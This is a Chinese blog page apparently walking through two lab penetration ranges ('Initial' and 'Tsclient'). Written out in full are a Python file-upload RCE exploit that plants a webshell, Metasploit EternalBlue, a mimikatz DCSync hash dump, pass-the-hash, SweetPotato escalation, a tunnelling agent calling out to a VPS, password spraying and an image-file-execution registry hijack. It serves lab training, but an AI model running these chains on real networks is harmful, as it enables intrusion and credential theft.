<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>春秋云境靶场 | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="春秋云境靶场 - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/pentest/cqyj/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/pentest/cqyj/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/pentest/cqyj/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="春秋云境靶场">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-22T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-10-22T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="春秋云境靶场">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "PENTEST",
      "item": "https://z9nn8w.github.io/posts/pentest/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "春秋云境靶场",
      "item": "https://z9nn8w.github.io/posts/pentest/cqyj/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "春秋云境靶场",
  "name": "春秋云境靶场",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "Initial 靶机ip:39.99.239.120\nnmap扫描开放端口及服务：\n$ nmap 39.99.239.120 --min-rate 10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-22 23:43 CST Nmap scan report for 39.99.239.120 Host is up (0.061s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds fscan扫描漏洞：\n$ ./fscan -h 39.99.239.120 ┌──────────────────────────────────────────────┐ │ ___ _ │ │ / _ \\ ___ ___ _ __ __ _ ___| | __ │ │ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ │ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ │ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ └──────────────────────────────────────────────┘ Fscan Version: 2.0.1 [1.1s] 已选择服务扫描模式 [1.1s] 开始信息扫描 [1.1s] 最终有效主机数量: 1 [1.1s] 开始主机扫描 [1.1s] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle [1.1s] 有效端口数量: 233 [1.2s] [*] 端口开放 39.99.239.120:80 [1.2s] [*] 端口开放 39.99.239.120:22 [4.1s] 扫描完成, 发现 2 个开放端口 [4.1s] 存活端口数量: 2 [4.1s] 开始漏洞扫描 [4.2s] POC加载完成: 总共387个，成功387个，失败0个 [4.3s] [*] 网站标题 http://39.99.239.120 状态码:200 长度:5578 标题:Bootstrap Material Admin [9.8s] [+] 目标: http://39.99.239.120:80 漏洞类型: poc-yaml-thinkphp5023-method-rce 漏洞名称: poc1 详细信息: 参考链接:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce [17.2s] 扫描已完成: 3/3 可以看到web服务存在thinkphp5.0.23-rce的漏洞，利用工具 ThinkphpGUI 直接打：\n蚁剑连上webshell，suid权限的文件没什么可利用的，看看 www-data 用户有什么可以执行的命令：\n(www-data:/) $ find / -perm -u=s -type f 2\u003e/dev/null /usr/bin/umount /usr/bin/newgrp /usr/bin/sudo /usr/bin/su /usr/bin/at /usr/bin/chsh /usr/bin/stapbpf /usr/bin/staprun /usr/bin/chfn /usr/bin/gpasswd /usr/bin/fusermount /usr/bin/passwd /usr/bin/mount /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device (www-data:/) $ sudo -l Matching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql sudo mysql提权：\nsudo mysql -e '\\! ls /root' sudo mysql -e '\\! ls /root/flag' sudo mysql -e '\\! cat /root/flag/flag01.txt' flag01.txt：\n(www-data:/) $ sudo mysql -e '\\! cat /root/flag/flag01.txt'\r██ ██ ██ ██ ███████ ███████ ██ ████ ██ ████████ ░░██ ██ ░██ ████ ██░░░░░██ ░██░░░░██ ████ ░██░██ ░██ ██░░░░░░██\r░░██ ██ ░██ ██░░██ ██ ░░██░██ ░██ ██░░██ ░██░░██ ░██ ██ ░░ ░░███ ░██ ██ ░░██ ░██ ░██░███████ ██ ░░██ ░██ ░░██ ░██░██ ██░██ ░██ ██████████░██ ░██░██░░░██ ██████████░██ ░░██░██░██ █████\r██ ░░██ ░██░██░░░░░░██░░██ ██ ░██ ░░██ ░██░░░░░░██░██ ░░████░░██ ░░░░██\r██ ░░██░██░██ ░██ ░░███████ ░██ ░░██░██ ░██░██ ░░███ ░░████████ ░░ ░░ ░░ ░░ ░░ ░░░░░░░ ░░ ░░ ░░ ░░ ░░ ░░░ ░░░░░░░░ Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.\rflag01: flag{60b53231- 后续打内网，先用蚁剑上传 fscan 到 /tmp 目录下，查一下ip网段：\n(www-data:/tmp) $ ip addr 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:05:d1:5c brd ff:ff:ff:ff:ff:ff inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 1892158414sec preferred_lft 1892158414sec inet6 fe80::216:3eff:fe05:d15c/64 scope link valid_lft forever preferred_lft forever 先给可执行权限，fscan 扫描后的结果会保存在当前目录下的 result.txt 中：\n(www-data:/tmp) $ chmod u+x fscan (www-data:/tmp) $ ./fscan -h 172.22.1.0/24 (www-data:/tmp) $ cat result.txt [2025-10-22 23:58:56] [HOST] 目标:172.22.1.15 状态:alive 详情:protocol=ICMP [2025-10-22 23:58:56] [HOST] 目标:172.22.1.18 状态:alive 详情:protocol=ICMP [2025-10-22 23:58:57] [HOST] 目标:172.22.1.2 状态:alive 详情:protocol=ICMP [2025-10-22 23:58:57] [HOST] 目标:172.22.1.21 状态:alive 详情:protocol=ICMP [2025-10-22 23:59:01] [PORT] 目标:172.22.1.15 状态:open 详情:port=80 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.15 状态:open 详情:port=22 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=135 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=445 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=139 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=445 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=389 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=139 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=80 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=135 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=88 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.21 状态:open 详情:port=139 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.21 状态:open 详情:port=135 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.21 状态:open 详情:port=445 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=3306 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.21 状态:identified 详情:hostname=XIAORANG-WIN7, ipv4=[172.22.1.21], ipv6=[] [2025-10-22 23:59:04] [VULN] 目标:172.22.1.21 状态:vulnerable 详情:port=445, vulnerability=MS17-010, os=Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.2 状态:identified 详情:port=445, service=smb, os=Windows Server 2016 Datacenter 14393 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.2 状态:identified 详情:domain_name=xiaorang.lab, server_service=DC01, port=139, computer_name=DC01.xiaorang.lab, netbios_domain=XIAORANG, netbios_computer=DC01, workstation_service=DC01, domain_controllers=XIAORANG, os_version=Windows Server 2016 Datacenter 14393 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.2 状态:identified 详情:hostname=DC01, ipv4=[172.22.1.2], ipv6=[] [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.18 状态:identified 详情:hostname=XIAORANG-OA01, ipv4=[172.22.1.18], ipv6=[] [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.15 状态:identified 详情:title=Bootstrap Material Admin, Url=http://172.22.1.15, status_code=200, length=5578, server_info=map[content-type:text/html; charset=utf-8 date:Wed, 22 Oct 2025 15:59:04 GMT length:5578 server:Apache/2.4.41 (Ubuntu) status_code:200 title:Bootstrap Material Admin vary:Accept-Encoding], fingerprints=[], port=80, service=http [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.18 状态:identified 详情:workstation_service=XIAORANG-OA01, server_service=XIAORANG-OA01, os_version=Windows Server 2012 R2 Datacenter 9600, port=139, computer_name=XIAORANG-OA01.xiaorang.lab, domain_name=xiaorang.lab, netbios_domain=XIAORANG, netbios_computer=XIAORANG-OA01 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.21 状态:identified 详情:netbios_computer=XIAORANG-WIN7, workstation_service=XIAORANG-WIN7, server_service=XIAORANG-WIN7, os_version=Windows Server 2008 R2 Enterprise 7601 Service Pack 1, port=139, computer_name=XIAORANG-WIN7.xiaorang.lab, domain_name=xiaorang.lab, netbios_domain=XIAORANG [2025-10-22 23:59:05] [SERVICE] 目标:172.22.1.18 状态:identified 详情:fingerprints=[], port=80, service=http, title=无标题, Url=http://172.22.1.18, status_code=302, length=0, server_info=map[cache-control:no-store, no-cache, must-revalidate content-length:0 content-type:text/html;charset=utf-8 date:Wed, 22 Oct 2025 15:59:04 GMT expires:Thu, 19 Nov 1981 08:52:00 GMT length:0 location:?m=login pragma:no-cache redirect_Url:http://172.22.1.18?m=login server:Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 set-cookie:PHPSESSID=usae6qvqpcqiqc1jrcdvuubeu6; path=/ status_code:302 title:无标题 x-powered-by:PHP/7.1.9] [2025-10-22 23:59:05] [SERVICE] 目标:172.22.1.18 状态:identified 详情:title=信呼协同办公系统, Url=http://172.22.1.18?m=login, status_code=200, length=4012, server_info=map[cache-control:no-store, no-cache, must-revalidate content-type:text/html;charset=utf-8 date:Wed, 22 Oct 2025 15:59:05 GMT expires:Thu, 19 Nov 1981 08:52:00 GMT length:4012 pragma:no-cache server:Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 set-cookie:PHPSESSID=fv540efek5pjvre6rfkjapbcvo; path=/ status_code:200 title:信呼协同办公系统 x-powered-by:PHP/7.1.9], fingerprints=[], port=80, service=http [2025-10-22 23:59:07] [VULN] 目标:http://172.22.1.15:80 状态:vulnerable 详情:vulnerability_type=poc-yaml-thinkphp5023-method-rce, vulnerability_name=poc1, references=[https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce] 信息收集：\n172.22.1.2：DC域控\r172.22.1.15：thinkphp5.0.23 RCE 已被利用\r172.22.1.18：信呼协同办公系统\r172.22.1.21：XIAORANG-WIN7 存在MS17-010漏洞 先利用 Stowaway 进行内网代理，蚁剑上传 linux_x64_agent，给执行权限，vps先开启服务端：\n./linux_x64_admin -l 2345 -s 114514 172.22.1.15 入口机连接服务端：\n./linux_x64_agent -c vps的ip:2345 -s 114514 vps开放端口3456：\n(admin) \u003e\u003e use 0\r(node 0) \u003e\u003e socks 3456\r[*] Trying to listen on 0.0.0.0:3456......\r[*] Waiting for agent's response......\r[*] Socks start successfully! 本地浏览器配置 FoxyProxy：\n访问到内网的信呼协同办公系统web服务：\n配置kali上的 /etc/proxychains4.conf：\nsocks5 vps的ip 3456 利用网上已有的脚本，exp.py：\nimport requests session = requests.session() url_pre = 'http://172.22.1.18/' url1 = url_pre + '?a=check\u0026m=login\u0026d=\u0026ajaxbool=true\u0026rnd=533953' url2 = url_pre + '/index.php?a=upfile\u0026m=upload\u0026d=public\u0026maxsize=100\u0026ajaxbool=true\u0026rnd=798913' url3 = url_pre + '/task.php?m=qcloudCos|runt\u0026a=run\u0026fileid=11' data1 = { 'rempass': '0', 'jmpass': 'false', 'device': '1625884034525', 'ltype': '0', 'adminuser': 'YWRtaW4=', 'adminpass': 'YWRtaW4xMjM=', 'yanzm': '' } r = session.post(url1, data=data1) r = session.post(url2, files={'file': open('1.php', 'r+')}) filepath = str(r.json()['filepath']) filepath = \"/\" + filepath.split('.uptemp')[0] + '.php' id = r.json()['id'] url3 = url_pre + f'/task.php?m=qcloudCos|runt\u0026a=run\u0026fileid={id}' r = session.get(url3) r = session.get(url_pre + filepath + \"?1=system('dir');\") print(r.text) 搭配 proxychains 利用脚本上传webshell：\n$ proxychains python exp.py [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.18:80 ... OK ������ C �еľ�û�б�ǩ�� �������к��� E0D6-4F4A C:\\phpStudy\\PHPTutorial\\WWW\\upload\\2025-10 ��Ŀ¼ 2025/10/23 11:40 . 2025/10/23 11:40 .. 2025/10/23 11:33 40 23_11332296.uptemp 2025/10/23 11:40 29 23_11405758.php 2 ���ļ� 69 �� 2 ��Ŀ¼ 22,776,528,896 ������ 蚁剑连配置好代理：\n连上内网的webshell，查看当前用户：\nC:\\phpStudy\\PHPTutorial\\WWW\\upload\\2025-10\u003e whoami\rnt authority\\system C:/Users/Administrator/flag/flag02.txt：\n___ ___ ___ ________ ________ ________ ________ ________ ________ |\\ \\ / /|\\ \\|\\ __ \\|\\ __ \\|\\ __ \\|\\ __ \\|\\ ___ \\|\\ ____\\ \\ \\ \\/ / | \\ \\ \\ \\|\\ \\ \\ \\|\\ \\ \\ \\|\\ \\ \\ \\|\\ \\ \\ \\\\ \\ \\ \\ \\___| \\ \\ / / \\ \\ \\ \\ __ \\ \\ \\\\\\ \\ \\ _ _\\ \\ __ \\ \\ \\\\ \\ \\ \\ \\ ___ / \\/ \\ \\ \\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\\\ \\\\ \\ \\ \\ \\ \\ \\\\ \\ \\ \\ \\|\\ \\ / /\\ \\ \\ \\__\\ \\__\\ \\__\\ \\_______\\ \\__\\\\ _\\\\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\_______\\\r/__/ /\\ __\\ \\|__|\\|__|\\|__|\\|_______|\\|__|\\|__|\\|__|\\|__|\\|__| \\|__|\\|_______|\r|__|/ \\|__| flag02: 2ce3-4813-87d4-\rAwesome! ! ! You found the second flag, now you can attack the domain controller. proxychains + msfconsole 打永恒之蓝：\n$ proxychains msfconsole msf6 \u003e search ms17-010 msf6 \u003e use exploit/windows/smb/ms17_010_eternalblue msf6 exploit(windows/smb/ms17_010_eternalblue) \u003e show payloads msf6 exploit(windows/smb/ms17_010_eternalblue) \u003e set payload windows/x64/meterpreter/bind_tcp_uuid msf6 exploit(windows/smb/ms17_010_eternalblue) \u003e set RHOSTS 172.22.1.21 msf6 exploit(windows/smb/ms17_010_eternalblue) \u003e exploit 运行成功后出现 meterpreter\u003e，此时已经是SYSTEM 账户，可以通过 DCSync 来导出所有用户的 hash 然后进行哈希传递攻击，要想使用 DCSync 必须获得以下任一用户的权限：\nAdministrators 组内的用户\rDomain Admins 组内的用户\rEnterprise Domain Admins 组内的用户 调用mimikatz模块打 PTH，导出域内所有用户的信息(包括哈希值)：\nload kiwi kiwi_cmd \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit [DC] 'xiaorang.lab' will be the domain [DC] 'DC01.xiaorang.lab' will be the DC server [DC] Exporting domain 'xiaorang.lab' [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) 502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 514 1106 Marcus e07510a4284b3c97c8e7dee970918c5c 512 1107 Charles f6a9881cd5ae709abb4ac9ab87f24617 512 1000 DC01$ 5e213d826e0f3abd5da6a60008fc7d17 532480 500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 512 1104 XIAORANG-OA01$ 96772bfc48f72ad75bee0775454111f1 4096 1108 XIAORANG-WIN7$ 71611aa5ef5bb0f273b6bb8c1e88b990 4096 mimikatz(powershell) # exit Bye! proxychains + crackmapexec 来进行横向移动，直接执行获取flag3的命令：\n$ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \"type Users\\Administrator\\flag\\flag03.txt\" [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing FTP protocol database [*] Initializing SSH protocol database [*] Initializing SMB protocol database [*] Initializing RDP protocol database [*] Initializing LDAP protocol database [*] Initializing WINRM protocol database [*] Initializing MSSQL protocol database [*] Copying default configuration file [*] Generating SSL certificate [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:445 ... OK [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:135 ... OK SMB 172.22.1.2 445 DC01 [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True) [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:445 ... OK SMB 172.22.1.2 445 DC01 [+] xiaorang.lab\\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!) [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:135 ... OK [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:49668 ... OK SMB 172.22.1.2 445 DC01 [+] Executed command SMB 172.22.1.2 445 DC01 ___ ___ SMB 172.22.1.2 445 DC01 \\\\ / / / / // | | // ) ) // ) ) // | | /| / / // ) ) SMB 172.22.1.2 445 DC01 \\ / / / //__| | // / / //___/ / //__| | //| / / // SMB 172.22.1.2 445 DC01 / / / / / ___ | // / / / ___ ( / ___ | // | / / // ____ SMB 172.22.1.2 445 DC01 / /\\\\ / / // | | // / / // | | // | | // | / / // / / SMB 172.22.1.2 445 DC01 / / \\\\ __/ /___ // | | ((___/ / // | | // | | // |/ / ((____/ / SMB 172.22.1.2 445 DC01 SMB 172.22.1.2 445 DC01 SMB 172.22.1.2 445 DC01 flag03: e8f88d0d43d6} SMB 172.22.1.2 445 DC01 SMB 172.22.1.2 445 DC01 Unbelievable! ! You found the last flag, which means you have full control over the entire domain network. flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}\n参考资料：\nhttps://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/\nTsclient 靶机ip：39.98.109.218\nnmap：\nnmap 39.98.109.218 -sV -sS --min-rate 10000 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 18:24 HKT Nmap scan report for 39.98.109.218 Host is up (0.0048s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds fscan扫描漏洞：\n./fscan -h 39.98.109.218 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan 39.98.109.218:1433 open 39.98.109.218:80 open [*] alive ports len is: 2 start vulscan [*] WebTitle http://39.98.109.218 code:200 len:703 title:IIS Windows Server [+] mssql 39.98.109.218:1433:sa 1qaz!QAZ 已完成 2/2 [*] 扫描结束,耗时: 10.136861589s 扫出 mssql 服务开放在端口1433上，存在弱口令问题，用户名sa，密码1qaz!QAZ，用MDUT连上：\nwhoami：\nnt service\\mssqlserver ipconfig：\nWindows IP 配置\r以太网适配器 以太网:\r连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::e576:667d:2727:e225%14\rIPv4 地址 . . . . . . . . . . . . : 172.22.8.18\r子网掩码 . . . . . . . . . . . . : 255.255.0.0\r默认网关. . . . . . . . . . . . . : 172.22.255.253\r隧道适配器 isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:\r媒体状态 . . . . . . . . . . . . : 媒体已断开连接\r连接特定的 DNS 后缀 . . . . . . . : 隧道适配器 Teredo Tunneling Pseudo-Interface:\r连接特定的 DNS 后缀 . . . . . . . : IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4ee:26a:d89d:9225\r本地链接 IPv6 地址. . . . . . . . : fe80::4ee:26a:d89d:9225%12\r默认网关. . . . . . . . . . . . . : :: 上传SweetPotato.exe到 C:/Users/Public/ 目录下进行提权：\nC:/Users/Public/SweetPotato.exe -a whoami flag01.txt：\nC:/Users/Public/SweetPotato.exe -a \"type C:\\Users\\Administrator\\flag\\flag01.txt\" 上传cs stager并用以 nt authority\\system 权限运行：\nC:/Users/Public/SweetPotato.exe -a C:/Users/Public/artifact.exe cs上线：\n查看本地用户账户：\nshell net user 获取当前登录用户和远程登录用户：\nshell quser hashdump导出所有用户哈希：\nhashdump john用户之前看到作为本地用户而且是在线的，查看一下占用了哪些进程：\n进程注入后john上线cs：\n已经知道john在使用远程桌面，查看john的网络连接，可能有网络驱动器映射：\nshell net use 发现共享 TSCLIENT 的C盘，直接读敏感文件：\nshell dir \\\\TSCLIENT\\C\rshell type \\\\TSCLIENT\\C\\credential.txt credential.txt：\nxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有个hint提示 hijack image (映像劫持)\n先上传 fscan.exe 到靶机，用system权限的用户扫一遍内网：\nshell C:\\Users\\Public\\fscan.exe -h 172.22.8.18/24\rstart infoscan\r(icmp) Target 172.22.8.18 is alive\r(icmp) Target 172.22.8.15 is alive\r(icmp) Target 172.22.8.31 is alive\r(icmp) Target 172.22.8.46 is alive\r[*] Icmp alive hosts len is: 4\r172.22.8.15:88 open\r172.22.8.46:445 open\r172.22.8.31:445 open\r172.22.8.18:1433 open\r172.22.8.15:445 open\r172.22.8.18:445 open\r172.22.8.46:139 open\r172.22.8.31:139 open\r172.22.8.15:139 open\r172.22.8.31:135 open\r172.22.8.46:135 open\r172.22.8.15:135 open\r172.22.8.18:139 open\r172.22.8.18:135 open\r172.22.8.46:80 open\r172.22.8.18:80 open\r[*] alive ports len is: 16\rstart vulscan\r[*] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT [*] NetBios 172.22.8.15 [+] DC:XIAORANG\\DC01 [*] NetInfo [*]172.22.8.31\r[-\u003e]WIN19-CLIENT\r[-\u003e]172.22.8.31\r[*] WebTitle http://172.22.8.18 code:200 len:703 title:IIS Windows Server\r[*] NetInfo [*]172.22.8.46\r[-\u003e]WIN2016\r[-\u003e]172.22.8.46\r[*] NetInfo [*]172.22.8.18\r[-\u003e]WIN-WEB\r[-\u003e]172.22.8.18\r[*] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393\r[*] NetInfo [*]172.22.8.15\r[-\u003e]DC01\r[-\u003e]172.22.8.15\r[*] WebTitle http://172.22.8.46 code:200 len:703 title:IIS Windows Server\r[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ 总结一下：\n172.22.8.18 WIN-WEB 目前这台非域机器，已拿下\r172.22.8.15 DC01 域控 172.22.8.31 WIN19-CLIENT 域机器\r172.22.8.46 WIN2016 用stowaway搭建内网代理方便后续渗透，靶机当跳板机，上传 windows_x64_agent.exe，vps上运行控制端 linux_x64_admin 开放2333端口：\n./linux_x64_admin -l 2333 -s 114514 靶机连上vps控制端：\nshell C:\\Users\\Public\\windows_x64_agent.exe -c 121.40.46.63:2333 -s 114514 --reconnect 8 建立3456端口代理：\n再配置一下kali的proxychains，用之前 credential.txt 里的用户密码尝试喷洒：\nproxychains4 crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#' SMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) SMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False) SMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED [proxychains] Strict chain ... 121.40.46.63:3456 [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.18:445 ... 172.22.8.101:445 ... OK SMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE [proxychains] Strict chain ... 121.40.46.63:3456 [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.102:445 ... 172.22.8.15:445 ... OK [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.15:445 ... OK SMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED [proxychains] Strict chain ... 121.40.46.63:3456 [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.31:445 ... 172.22.8.103:445 ... OK [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.31:445 ... OK SMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 密码都过期了，利用smbpasswd.py进行密码修改，否则无法利用rdp桌面登录：\ncd /usr/share/doc/python3-impacket/examples/ proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'qwert@12345' 远程桌面登录开个共享文件夹方便后续渗透：\nproxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'qwert@12345' -r disk:share=/home/w8nn9z/Desktop/shared powershell中执行命令来获取访问控制列表(ACL)的信息：\nget-acl -path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | fl * 发现只要是登录认证成功的用户都有修改注册表的权限，这样就可以给放大镜设置debugger来进行提权，运行放大镜程序magnify.exe会先执行cmd.exe：\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" type C\\Users\\Administrator\\flag\\flag02.txt flag02.txt：\n172.22.8.46 